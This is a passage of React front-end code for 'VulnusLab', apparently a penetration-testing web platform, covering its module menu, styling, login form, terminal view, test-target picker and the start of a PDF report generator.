import React, { useState, useRef, useEffect } from "react";
import { jsPDF } from "jspdf";

// Resolves the API base URL. Production builds (no explicit port) use same-origin so
// requests go through the nginx proxy. Dev (CRA on :3000) defaults to localhost:8000.
// Override via localStorage.cyberApiUrl for custom backends.
export const getApiUrl = () => {
  const stored = localStorage.getItem("cyberApiUrl");
  if (stored) return stored;
  const port = window.location.port;
  if (port === "" || port === "80" || port === "443") return "";
  return `http://${window.location.hostname}:8000`;
};
export const getAuthToken = () => localStorage.getItem("cyberToken") || "";
const API = getApiUrl();

// PDF filename helpers — used by all report generators
const _pdfFn = t => (t||"target").replace(/https?:\/\//,"").replace(/[^a-zA-Z0-9.\-]/g,"_").replace(/_+/g,"_").replace(/^_|_$/g,"");
const _pdfDt = () => { const d=new Date(); return `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,"0")}-${String(d.getDate()).padStart(2,"0")}_${String(d.getHours()).padStart(2,"0")}-${String(d.getMinutes()).padStart(2,"0")}`; };

const LOGO = "/logo.svg";


const MODULES = [
  // ── FREE (everyone) ──────────────────────────────────────────
  { id:"dashboard", icon:"🏠", label:"Dashboard",                          cat:"core",    free:true  },
  { id:"recon",     icon:"🔍", label:"Information Gathering & Recon",      cat:"recon",   free:true  },
  { id:"guide",     icon:"📖", label:"Run Guide & Lab Targets",            cat:"tools",   free:true  },
  { id:"report",    icon:"📄", label:"Report Writing",                     cat:"tools",   free:true  },

  // ── TRIAL ACCESS (free tier gets these) ─────────────────────
  { id:"vuln",      icon:"🛡️", label:"Vulnerability Scanning",             cat:"scan",    free:false, trial:true },
  { id:"webapp",    icon:"🌐", label:"Web Application Pentesting",         cat:"scan",    free:false, trial:true, featured:true },

  // ── SCANNING ────────────────────────────────────────────────
  { id:"osint",     icon:"🌍", label:"Advanced OSINT & Threat Intel",      cat:"scan",    free:false },

  // ── EXPLOITATION ─────────────────────────────────────────────
  { id:"exploit",   icon:"💥", label:"Exploitation",                       cat:"exploit", free:false, featured:true },
  { id:"buffer",    icon:"💾", label:"Buffer Overflow",                    cat:"exploit", free:false },
  { id:"client",    icon:"🎯", label:"Client-Side Attacks",                cat:"exploit", free:false, comingSoon:true },
  { id:"sysexploit",icon:"⚙️", label:"System Exploitation",               cat:"exploit", free:false, comingSoon:true },
  { id:"msf",       icon:"🧰", label:"Metasploit Framework",               cat:"exploit", free:false, comingSoon:true },

  // ── POST-EXPLOITATION ────────────────────────────────────────
  { id:"privesc",   icon:"⬆️", label:"Privilege Escalation",               cat:"post",    free:false, comingSoon:true },
  { id:"post",      icon:"🕵️", label:"Post Exploitation",                  cat:"post",    free:false, comingSoon:true },
  { id:"pivot",     icon:"🔄", label:"Pivoting & Lateral Movement",        cat:"post",    free:false, comingSoon:true },

  // ── NETWORK & INFRA ──────────────────────────────────────────
  { id:"network",   icon:"🌐", label:"Network Attacks",                    cat:"network", free:false, comingSoon:true },
  { id:"tunnel",    icon:"🔗", label:"Port Redirection & Tunneling",       cat:"network", free:false, comingSoon:true },
  { id:"password",  icon:"🔑", label:"Password Attacks",                   cat:"network", free:false },
  { id:"auth",      icon:"🛂", label:"Authentication Attacks",             cat:"network", free:false, comingSoon:true },
  { id:"wireless",  icon:"📶", label:"Wireless Network Attacks",           cat:"network", free:false, comingSoon:true },

  // ── ADVANCED ─────────────────────────────────────────────────
  { id:"ad",        icon:"🏢", label:"Active Directory Attacks",           cat:"advanced",free:false, comingSoon:true },
  { id:"av",        icon:"🥷", label:"Antivirus Evasion",                  cat:"advanced",free:false, comingSoon:true },
  { id:"cloud",     icon:"☁️", label:"Cloud Security Testing",             cat:"advanced",free:false, comingSoon:true },
  { id:"mobile",    icon:"📱", label:"Mobile Application Testing",         cat:"advanced",free:false, comingSoon:true },
  { id:"api",       icon:"🔌", label:"API Security Testing",               cat:"advanced",free:false, comingSoon:true },

  // ── DATA PROTECTION ──────────────────────────────────────────
  { id:"backups",   icon:"📦", label:"My Backups",                          cat:"data",    free:true  },
  { id:"vault",     icon:"🔐", label:"VAULT — Master Archive",              cat:"admin",   free:false, admin:true },

  // ── TOOLS ────────────────────────────────────────────────────
  { id:"tools",     icon:"🛠️", label:"Tool Manager & Updater",            cat:"tools",   free:false, admin:true },
];

const CSS = `
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
  *{box-sizing:border-box;margin:0;padding:0;}

  body{
    font-family:'Inter',sans-serif;
    background:#020617;
    color:#e2e8f0;
    font-size:14px;
    line-height:1.6;
    -webkit-font-smoothing:antialiased;
    -moz-osx-font-smoothing:grayscale;
  }

  /* Global text color improvements */
  h1,h2,h3,h4,h5,h6 { color:#f1f5f9; font-weight:700; line-height:1.3; }
  p { color:#cbd5e1; line-height:1.7; }
  label { color:#94a3b8; font-size:13px; }
  span { color:inherit; }

  /* Scrollbar */
  ::-webkit-scrollbar{width:5px;height:5px;}
  ::-webkit-scrollbar-track{background:#0a0f1e;}
  ::-webkit-scrollbar-thumb{background:#334155;border-radius:6px;}
  ::-webkit-scrollbar-thumb:hover{background:#475569;}

  /* Animations */
  @keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
  @keyframes spin{to{transform:rotate(360deg)}}
  @keyframes glow{0%,100%{box-shadow:0 0 8px rgba(59,130,246,0.3)}50%{box-shadow:0 0 20px rgba(59,130,246,0.6)}}

  .fade{animation:fadeUp .3s ease;}

  /* Sidebar nav */
  .nav-btn:hover{background:#1e293b!important;}
  .nav-btn span{ font-size:13px !important; font-weight:500 !important; color:#94a3b8; letter-spacing:0.2px; }

  /* Table rows */
  .row:hover{background:#0f172a!important;}

  /* Tool cards */
  .tool-card:hover{border-color:#3b82f680!important;transform:translateY(-1px);}
  .tool-card{transition:all .2s;}

  /* Global input styling */
  input, textarea, select {
    font-family:'Inter',sans-serif !important;
    font-size:13px !important;
    color:#e2e8f0 !important;
    letter-spacing:0.2px;
  }
  input::placeholder, textarea::placeholder { color:#475569 !important; }

  /* Section headers */
  .section-label {
    font-size:10px;
    font-weight:700;
    letter-spacing:1.5px;
    text-transform:uppercase;
    color:#64748b;
  }

  /* Monospace text */
  .mono {
    font-family:'JetBrains Mono',monospace;
    font-size:12px;
    color:#94a3b8;
    letter-spacing:0.3px;
  }

  /* Tool name text */
  .tool-name {
    font-size:13px;
    font-weight:600;
    color:#cbd5e1;
    letter-spacing:0.1px;
  }

  /* Description text */
  .desc-text {
    font-size:12px;
    color:#64748b;
    line-height:1.5;
  }

  /* Status dot */
  .status-dot {
    width:7px; height:7px;
    border-radius:50%;
    display:inline-block;
  }

  /* Buttons */
  button { font-family:'Inter',sans-serif !important; }

  /* Terminal output */
  .terminal {
    font-family:'JetBrains Mono',monospace;
    font-size:12px;
    line-height:1.7;
    color:#94a3b8;
  }
`;

async function api(path, method, body, token) {
  method = method || "GET";
  const headers = { "Content-Type":"application/json" };
  if (token) headers["Authorization"] = "Bearer " + token;
  const res = await fetch(API + path, {
    method: method,
    headers: headers,
    body: body ? JSON.stringify(body) : null
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({ detail: res.statusText }));
    throw new Error(err.detail || res.statusText);
  }
  return res.json();
}

function Badge(props) {
  const label = props.label;
  const color = props.color || "blue";
  const size  = props.size || "sm";
  const colors = {
    blue:   {bg:"#0c1a3d", b:"#1e40af", t:"#60a5fa"},
    green:  {bg:"#052e16", b:"#166534", t:"#4ade80"},
    red:    {bg:"#1c0000", b:"#991b1b", t:"#f87171"},
    yellow: {bg:"#2d1f00", b:"#92400e", t:"#fbbf24"},
    purple: {bg:"#1a0a3d", b:"#5b21b6", t:"#a78bfa"},
    gray:   {bg:"#0f172a", b:"#334155", t:"#94a3b8"},
    orange: {bg:"#2d1000", b:"#9a3412", t:"#fb923c"},
  };
  const c  = colors[color] || colors.blue;
  const fs = size === "xs" ? 9 : 11;
  const pd = size === "xs" ? "1px 6px" : "2px 8px";
  return (
    <span style={{background:c.bg,border:"1px solid "+c.b,color:c.t,fontSize:fs,fontWeight:600,padding:pd,borderRadius:4,whiteSpace:"nowrap",letterSpacing:.3}}>
      {label}
    </span>
  );
}

function severityColor(sev) {
  if (sev === "CRITICAL") return "red";
  if (sev === "HIGH")     return "orange";
  if (sev === "MEDIUM")   return "yellow";
  if (sev === "LOW")      return "blue";
  return "gray";
}

const Tagline = ({size=10}) => (
  <div style={{display:"flex",alignItems:"center",justifyContent:"center",gap:0}}>
    <div style={{flex:1,height:1,background:"linear-gradient(90deg,transparent,#3b82f6)"}}/>
    <span style={{fontSize:size,color:"#ffffff",letterSpacing:2,fontWeight:700,padding:"0 8px"}}>PROTECT</span>
    <div style={{width:1,height:size+2,background:"#3b82f6",flexShrink:0}}/>
    <span style={{fontSize:size,color:"#ffffff",letterSpacing:2,fontWeight:700,padding:"0 8px"}}>DETECT</span>
    <div style={{width:1,height:size+2,background:"#3b82f6",flexShrink:0}}/>
    <span style={{fontSize:size,color:"#ffffff",letterSpacing:2,fontWeight:700,padding:"0 8px"}}>RESPOND</span>
    <div style={{flex:1,height:1,background:"linear-gradient(90deg,#3b82f6,transparent)"}}/>
  </div>
);
function Login(props) {
  const onLogin = props.onLogin;
  const [mode,setMode]   = useState("login"); // "login" | "register"
  const [u,setU]         = useState("");
  const [email,setEmail] = useState("");
  const [p,setP]         = useState("");
  const [p2,setP2]       = useState("");
  const [err,setErr]     = useState("");
  const [ok,setOk]       = useState("");
  const [loading,setL]   = useState(false);
  const [uFocus,setUF]   = useState(false);
  const [eFocus,setEF]   = useState(false);
  const [pFocus,setPF]   = useState(false);
  const [p2Focus,setP2F] = useState(false);
  const [showPw,setShow] = useState(false);

  const switchMode = (m) => { setMode(m); setErr(""); setOk(""); };

  const submit = async(e) => {
    e.preventDefault();
    setL(true); setErr(""); setOk("");
    try {
      if (mode === "register") {
        if (p !== p2) { setErr("Passwords do not match"); setL(false); return; }
        const data = await api("/api/auth/register","POST",{username:u,email,password:p});
        onLogin(data.access_token, data.role, data.username, data.plan||"trial");
      } else {
        const data = await api("/api/auth/login","POST",{username:u,password:p});
        onLogin(data.access_token, data.role, data.username, data.plan||"trial");
      }
    } catch(e2) { setErr(e2.message); }
    setL(false);
  };

  const box = (focused) => ({
    display:"flex", alignItems:"center", gap:12,
    background: focused ? "rgba(59,130,246,0.07)" : "rgba(2,6,23,0.85)",
    border: `1.5px solid ${focused ? "#3b82f6" : "rgba(51,65,85,0.7)"}`,
    borderRadius:12, padding:"13px 16px",
    boxShadow: focused
      ? "0 0 0 4px rgba(59,130,246,0.12), inset 0 1px 3px rgba(0,0,0,0.4)"
      : "inset 0 1px 3px rgba(0,0,0,0.4)",
    transition:"all 0.2s ease"
  });

  const IconUser = ({c}) => (
    <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke={c} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
    </svg>
  );
  const IconLock = ({c}) => (
    <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke={c} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
    </svg>
  );
  const IconEye  = () => (
    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#475569" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
    </svg>
  );
  const IconEyeOff = () => (
    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#475569" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
      <line x1="1" y1="1" x2="23" y2="23"/>
    </svg>
  );

  return (
    <div style={{minHeight:"100vh",background:"#06091a",display:"flex",alignItems:"center",justifyContent:"center",fontFamily:"'Segoe UI',sans-serif",position:"relative",overflow:"hidden"}}>
      <style>{CSS}</style>

      {/* Dot-grid background */}
      <div style={{position:"absolute",inset:0,backgroundImage:"radial-gradient(rgba(59,130,246,0.18) 1px,transparent 1px)",backgroundSize:"32px 32px",opacity:0.45,pointerEvents:"none"}}/>

      {/* Ambient glow blobs */}
      <div style={{position:"absolute",width:500,height:500,borderRadius:"50%",background:"radial-gradient(circle,rgba(59,130,246,0.12) 0%,transparent 70%)",top:"-10%",left:"5%",filter:"blur(50px)",pointerEvents:"none"}}/>
      <div style={{position:"absolute",width:350,height:350,borderRadius:"50%",background:"radial-gradient(circle,rgba(139,92,246,0.09) 0%,transparent 70%)",bottom:"5%",right:"10%",filter:"blur(50px)",pointerEvents:"none"}}/>

      {/* Card */}
      <div style={{position:"relative",zIndex:1,width:430,background:"rgba(8,12,28,0.96)",border:"1px solid rgba(59,130,246,0.2)",borderRadius:24,padding:"44px 40px 36px",boxShadow:"0 0 0 1px rgba(255,255,255,0.03) inset, 0 30px 70px rgba(0,0,0,0.7), 0 0 60px rgba(59,130,246,0.07)"}}>

        {/* Top gradient accent */}
        <div style={{position:"absolute",top:0,left:"15%",right:"15%",height:2,background:"linear-gradient(90deg,transparent,#3b82f6,#818cf8,#3b82f6,transparent)",borderRadius:2}}/>

        {/* Logo */}
        <div style={{display:"flex",justifyContent:"center",marginBottom:4}}>
          <img src={LOGO} alt="logo" style={{width:130,height:130,objectFit:"contain",display:"block"}}/>
        </div>

        {/* Brand */}
        <h1 style={{fontSize:26,fontWeight:900,letterSpacing:5,margin:"0 0 4px",textAlign:"center",lineHeight:1.1}}>
          <span style={{color:"#f1f5f9"}}>VULNUS</span><span style={{color:"#3b82f6"}}>LAB</span>
        </h1>
        <div style={{marginBottom:28,textAlign:"center"}}><Tagline size={10}/></div>

        {/* Mode tabs */}
        <div style={{display:"flex",gap:0,marginBottom:24,borderRadius:10,overflow:"hidden",border:"1px solid rgba(51,65,85,0.6)"}}>
          {["login","register"].map(m=>(
            <button key={m} onClick={()=>switchMode(m)} style={{
              flex:1,padding:"10px",border:"none",cursor:"pointer",fontSize:11,fontWeight:700,
              letterSpacing:2,textTransform:"uppercase",fontFamily:"monospace",transition:"all 0.2s",
              background: mode===m ? "linear-gradient(135deg,#1e40af,#3b82f6)" : "rgba(2,6,23,0.7)",
              color: mode===m ? "#fff" : "#475569"
            }}>{m==="login"?"Sign In":"Register"}</button>
          ))}
        </div>

        {/* Username */}
        <div style={{marginBottom:14}}>
          <label style={{fontSize:10,color:uFocus?"#60a5fa":"#475569",fontWeight:700,display:"block",marginBottom:7,letterSpacing:3,textTransform:"uppercase",fontFamily:"monospace",transition:"color 0.2s"}}>Username</label>
          <div style={box(uFocus)}>
            <IconUser c={uFocus?"#3b82f6":"#334155"}/>
            <input value={u} onChange={e=>setU(e.target.value)}
              onFocus={()=>setUF(true)} onBlur={()=>setUF(false)}
              onKeyDown={e=>e.key==="Enter"&&submit(e)}
              placeholder="Enter your username"
              autoComplete="username"
              style={{flex:1,background:"transparent",border:"none",color:"#e2e8f0",fontSize:14,outline:"none",fontFamily:"'Segoe UI',sans-serif",letterSpacing:0.3}}/>
          </div>
        </div>

        {/* Email — register only */}
        {mode==="register" && (
          <div style={{marginBottom:14}}>
            <label style={{fontSize:10,color:eFocus?"#60a5fa":"#475569",fontWeight:700,display:"block",marginBottom:7,letterSpacing:3,textTransform:"uppercase",fontFamily:"monospace",transition:"color 0.2s"}}>Email</label>
            <div style={box(eFocus)}>
              <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke={eFocus?"#3b82f6":"#334155"} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/>
              </svg>
              <input type="email" value={email} onChange={e=>setEmail(e.target.value)}
                onFocus={()=>setEF(true)} onBlur={()=>setEF(false)}
                onKeyDown={e=>e.key==="Enter"&&submit(e)}
                placeholder="Enter your email"
                autoComplete="email"
                style={{flex:1,background:"transparent",border:"none",color:"#e2e8f0",fontSize:14,outline:"none",fontFamily:"'Segoe UI',sans-serif",letterSpacing:0.3}}/>
            </div>
          </div>
        )}

        {/* Password */}
        <div style={{marginBottom:mode==="register"?14:24}}>
          <label style={{fontSize:10,color:pFocus?"#60a5fa":"#475569",fontWeight:700,display:"block",marginBottom:7,letterSpacing:3,textTransform:"uppercase",fontFamily:"monospace",transition:"color 0.2s"}}>Password</label>
          <div style={box(pFocus)}>
            <IconLock c={pFocus?"#3b82f6":"#334155"}/>
            <input type={showPw?"text":"password"} value={p} onChange={e=>setP(e.target.value)}
              onFocus={()=>setPF(true)} onBlur={()=>setPF(false)}
              onKeyDown={e=>e.key==="Enter"&&submit(e)}
              placeholder={mode==="register"?"Min 6 characters":"Enter your password"}
              autoComplete={mode==="register"?"new-password":"current-password"}
              style={{flex:1,background:"transparent",border:"none",color:"#e2e8f0",fontSize:14,outline:"none",fontFamily:"'Segoe UI',sans-serif",letterSpacing:0.3}}/>
            <button onClick={()=>setShow(!showPw)} style={{background:"none",border:"none",cursor:"pointer",padding:2,display:"flex",alignItems:"center",opacity:0.7}} tabIndex={-1}>
              {showPw ? <IconEyeOff/> : <IconEye/>}
            </button>
          </div>
        </div>

        {/* Confirm Password — register only */}
        {mode==="register" && (
          <div style={{marginBottom:24}}>
            <label style={{fontSize:10,color:p2Focus?"#60a5fa":"#475569",fontWeight:700,display:"block",marginBottom:7,letterSpacing:3,textTransform:"uppercase",fontFamily:"monospace",transition:"color 0.2s"}}>Confirm Password</label>
            <div style={box(p2Focus)}>
              <IconLock c={p2Focus?"#3b82f6":"#334155"}/>
              <input type="password" value={p2} onChange={e=>setP2(e.target.value)}
                onFocus={()=>setP2F(true)} onBlur={()=>setP2F(false)}
                onKeyDown={e=>e.key==="Enter"&&submit(e)}
                placeholder="Repeat your password"
                autoComplete="new-password"
                style={{flex:1,background:"transparent",border:"none",color:"#e2e8f0",fontSize:14,outline:"none",fontFamily:"'Segoe UI',sans-serif",letterSpacing:0.3}}/>
            </div>
          </div>
        )}

        {/* Error */}
        {err && (
          <div style={{background:"rgba(127,29,29,0.25)",border:"1px solid rgba(239,68,68,0.35)",borderRadius:10,padding:"11px 14px",color:"#fca5a5",fontSize:12,marginBottom:16,display:"flex",alignItems:"center",gap:9}}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fca5a5" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
            </svg>
            {err}
          </div>
        )}

        {/* Submit button */}
        <button onClick={submit} disabled={loading} style={{
          width:"100%", border:"none", borderRadius:12, padding:"15px",
          background: loading ? "#1e293b" : "linear-gradient(135deg,#1e40af,#3b82f6,#6366f1)",
          color: loading ? "#475569" : "#fff",
          fontSize:13, fontWeight:700, cursor:loading?"not-allowed":"pointer",
          letterSpacing:3, textTransform:"uppercase",
          boxShadow: loading ? "none" : "0 4px 28px rgba(59,130,246,0.45), inset 0 1px 0 rgba(255,255,255,0.12)",
          display:"flex", alignItems:"center", justifyContent:"center", gap:10,
          marginBottom:20, transition:"all 0.2s"
        }}>
          {loading ? (
            <>
              <div style={{width:13,height:13,border:"2px solid #334155",borderTopColor:"#64748b",borderRadius:"50%",animation:"spin .7s linear infinite"}}/>
              {mode==="register"?"Creating Account...":"Authenticating..."}
            </>
          ) : (
            <>
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/>
              </svg>
              {mode==="register"?"Create Account":"Sign In"}
            </>
          )}
        </button>

        {/* Switch mode link */}
        <div style={{textAlign:"center",marginBottom:16}}>
          {mode==="login" ? (
            <span style={{fontSize:12,color:"#475569"}}>Don't have an account?{" "}
              <button onClick={()=>switchMode("register")} style={{background:"none",border:"none",color:"#3b82f6",cursor:"pointer",fontSize:12,fontWeight:700,padding:0}}>Register</button>
            </span>
          ) : (
            <span style={{fontSize:12,color:"#475569"}}>Already have an account?{" "}
              <button onClick={()=>switchMode("login")} style={{background:"none",border:"none",color:"#3b82f6",cursor:"pointer",fontSize:12,fontWeight:700,padding:0}}>Sign In</button>
            </span>
          )}
        </div>

        {/* Footer badge */}
        <div style={{display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>
          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#1e293b" strokeWidth="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
          <span style={{fontSize:10,color:"#1e293b",fontFamily:"monospace",letterSpacing:2,fontWeight:600}}>AUTHORIZED PERSONNEL ONLY</span>
          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#1e293b" strokeWidth="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        </div>

        {/* Bottom gradient accent */}
        <div style={{position:"absolute",bottom:0,left:"30%",right:"30%",height:1,background:"linear-gradient(90deg,transparent,rgba(59,130,246,0.3),transparent)"}}/>
      </div>
    </div>
  );
}

function Terminal(props) {
  const lines  = props.lines;
  const height = props.height || 160;
  const ref = useRef();
  useEffect(() => { if (ref.current) ref.current.scrollTop = ref.current.scrollHeight; }, [lines]);
  return (
    <div style={{background:"#020617",border:"1px solid #1e293b",borderRadius:8,overflow:"hidden"}}>
      <div style={{background:"#0f172a",padding:"8px 14px",borderBottom:"1px solid #1e293b",display:"flex",alignItems:"center",gap:8}}>
        <div style={{display:"flex",gap:5}}>
          <div style={{width:9,height:9,borderRadius:"50%",background:"#ef4444",opacity:.8}}/>
          <div style={{width:9,height:9,borderRadius:"50%",background:"#f59e0b",opacity:.8}}/>
          <div style={{width:9,height:9,borderRadius:"50%",background:"#22c55e",opacity:.8}}/>
        </div>
        <span style={{fontSize:11,color:"#334155",fontFamily:"JetBrains Mono,monospace"}}>Terminal — kali@backend</span>
      </div>
      <div ref={ref} style={{padding:14,height:height,overflowY:"auto"}}>
        {lines.map((l,i) => {
          const isOk    = l.startsWith("✓");
          const isErr   = l.startsWith("✗");
          const isArrow = l.startsWith("→") || l.startsWith("[*]");
          const color   = isOk?"#22c55e":isErr?"#ef4444":isArrow?"#60a5fa":"#64748b";
          return (
            <div key={i} style={{display:"flex",gap:8,marginBottom:2}}>
              <span style={{color:"#1e293b",fontFamily:"JetBrains Mono,monospace",fontSize:10,flexShrink:0}}>{String(i+1).padStart(3,"0")}</span>
              <span style={{fontFamily:"JetBrains Mono,monospace",fontSize:12,color:color,lineHeight:1.7}}>{l}</span>
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ── Reusable test-target picker ──────────────────────────────
function TestTargets({targets, onSelect}) {
  const [open,    setOpen]    = useState(false);
  const [closing, setClosing] = useState(false);
  const [copied,  setCopied]  = useState(null);

  const close = () => {
    setClosing(true);
    setTimeout(()=>{ setOpen(false); setClosing(false); }, 300);
  };

  const copy = (val,lab,i) => {
    if (navigator.clipboard) navigator.clipboard.writeText(val).catch(()=>{});
    onSelect(val, lab);
    setCopied(i);
    setTimeout(()=>{ setCopied(null); close(); }, 600);
  };

  return (
    <div style={{marginBottom:10}}>
      <button onClick={()=>open ? close() : setOpen(true)}
        style={{background:"none",border:"1px solid #1e3a8a",borderRadius:5,padding:"4px 12px",color:"#60a5fa",fontSize:11,fontWeight:600,cursor:"pointer",display:"flex",alignItems:"center",gap:5}}>
        🎯 Test Targets {open?"▲":"▼"}
      </button>
      {open&&(
        <div style={{background:"#020617",border:"1px solid #1e3a8a",borderRadius:6,marginTop:6,overflow:"hidden",
          animation: closing ? "fadeOut .3s ease forwards" : "fadeIn .2s ease"}}>
          <div style={{background:"#0f172a",padding:"6px 12px",borderBottom:"1px solid #1e293b",fontSize:10,color:"#475569",fontWeight:600,letterSpacing:1}}>
            INTENTIONALLY VULNERABLE — LEGAL TO TEST
          </div>
          {targets.map((t,i)=>(
            <div key={i} onClick={()=>copy(t.value,t.lab||null,i)}
              style={{display:"flex",alignItems:"center",gap:10,padding:"8px 12px",borderBottom:"1px solid #0f172a",cursor:"pointer",background:copied===i?"#1e3a5f":"transparent",transition:"background .15s"}}
              onMouseEnter={e=>e.currentTarget.style.background="#0f172a"}
              onMouseLeave={e=>e.currentTarget.style.background=copied===i?"#1e3a5f":"transparent"}>
              <span style={{fontSize:14}}>{t.icon}</span>
              <div style={{flex:1,minWidth:0}}>
                <div style={{fontSize:11,fontWeight:600,color:"#93c5fd"}}>{t.label}</div>
                <div style={{fontSize:10,color:"#475569",fontFamily:"JetBrains Mono,monospace",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{t.value}</div>
                {t.desc&&<div style={{fontSize:9,color:"#334155",marginTop:1}}>{t.desc}</div>}
              </div>
              <span style={{fontSize:10,color:copied===i?"#4ade80":"#334155",fontWeight:700,flexShrink:0}}>{copied===i?"✓ Selected":"Click"}</span>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// Shared severity → color mapping used by both PDF generators
const sevColor = s => ({
  CRITICAL:[[162,28,28],[254,226,226]],
  HIGH:    [[133,79,11],[254,215,170]],
  MEDIUM:  [[133,100,0],[254,240,138]],
  LOW:     [[21,128,61],[220,252,231]],
  INFO:    [[71,85,105],[226,232,240]],
}[s]||[[71,85,105],[226,232,240]]);

// FIX 2: PDF Report Generator
function generatePDF(reportData) {
  try {
  const { target, date, riskScore, riskLabel, summary, findings, ports, gobuster, ffuf, sqlmap, whatweb, toolsUsed, subdomains, dns, wafw00f, cms, ssl, cookies, cors, xss,
          commix, lfi, openredirect, sensitivefiles, hydra, ssrf, xxe, clickjacking, verbtamper, pollution,
          csrf, idor, ssti, fileupload,
          deserial, protopollution, typejuggling, jwt, graphql, nosql, oauth, hostheader, websocket, takeover, otp,
          rfi, smuggling, responsesplitting, sessionfixation, dataexfil, racecondition, smb, ftp, smtp, snmp,
          companyName, reporterName, reporterRole, customLogo, template, remediation } = reportData;
  // wasRun(key): returns true if tool was run or if toolsUsed is empty (show all)
  const _toolSet = new Set(toolsUsed||[]);
  const wasRun = key => _toolSet.size === 0 || _toolSet.has(key);

  const doc = new jsPDF({ orientation:"portrait", unit:"mm", format:"a4" });
    const pageW=210, margin=15, contentW=180;
    let y=0;

    const ACCENT_MAP = {standard:[15,110,86],corporate:[59,130,246],red:[239,68,68],gold:[245,158,11]};
    const GREEN  = ACCENT_MAP[template] || ACCENT_MAP.standard;
    const DGREEN = GREEN.map(v=>Math.max(0,Math.round(v*0.7)));
    const RED    = [162,28,28];
    const ORANGE = [133,79,11];
    const DARK   = [15,23,42];
    const LIGHT  = [248,250,252];
    const WHITE  = [255,255,255];
    const BORDER = [226,232,240];
    const PURPLE = [109,40,217];
    const GRAY   = [100,116,139];
    const BLUE   = [59,130,246];
    const LBLUE  = [235,245,255]; // light blue for section banners

    const drawBorder = () => {
      doc.setDrawColor(59,130,246); doc.setLineWidth(1.2);
      doc.rect(0,0,210,297,'S');
    };
    const newPage = () => { doc.addPage(); y=18; drawHeader(); };
    const chk = n => { if(y+n>278) newPage(); };
    const fillR = (x,yy,w,h,c) => { doc.setFillColor(...c); doc.rect(x,yy,w,h,"F"); };
    const rrect = (x,yy,w,h,r,c) => { doc.setFillColor(...c); doc.roundedRect(x,yy,w,h,r,r,"F"); };
    const hline = (x1,y1,x2,y2,c,lw) => { doc.setDrawColor(...c); doc.setLineWidth(lw||0.3); doc.line(x1,y1,x2,y2); };

    const txt = (t,x,yy,sz,c,bold,align,underline) => {
      doc.setFont("Arial", bold?"bold":"normal");
      doc.setFontSize(sz||10);
      doc.setTextColor(...(c||DARK));
      doc.text(String(t),x,yy,{align:align||"left"});
      if(underline){
        const tw = doc.getTextWidth(String(t));
        const lx = align==="center" ? x-tw/2 : align==="right" ? x-tw : x;
        hline(lx,yy+0.8,lx+tw,yy+0.8,c||DARK,0.4);
      }
    };

    const wtxt = (t,x,yy,maxW,sz,c,bold) => {
      doc.setFont("Arial",bold?"bold":"normal");
      doc.setFontSize(sz||9);
      doc.setTextColor(...(c||DARK));
      const ls = doc.splitTextToSize(String(t),maxW||contentW);
      doc.text(ls,x,yy);
      return ls.length*((sz||9)*0.42);
    };

    let _secN = 0;
    const sectionHead = (title,yy) => {
      _secN++;
      fillR(margin,yy,contentW,9,[220,230,245]);
      txt(_secN+". "+title,margin+4,yy+6.2,10,BLUE,true);
      return yy+13;
    };

    const tableHeader = (cols,widths,yy) => {
      fillR(margin,yy,contentW,8,DARK);
      let cx=margin+3;
      cols.forEach((c,i)=>{ txt(c,cx,yy+5.5,8,WHITE,true); cx+=widths[i]; });
      return yy+8;
    };

    const tableRow = (vals,widths,yy,even) => {
      fillR(margin,yy,contentW,7,even?LIGHT:WHITE);
      hline(margin,yy,pageW-margin,yy,BORDER,0.2);
      let cx=margin+3;
      vals.forEach((v,i)=>{
        if(v && v.__badge){
          const [bg,lt]=sevColor(v.val);
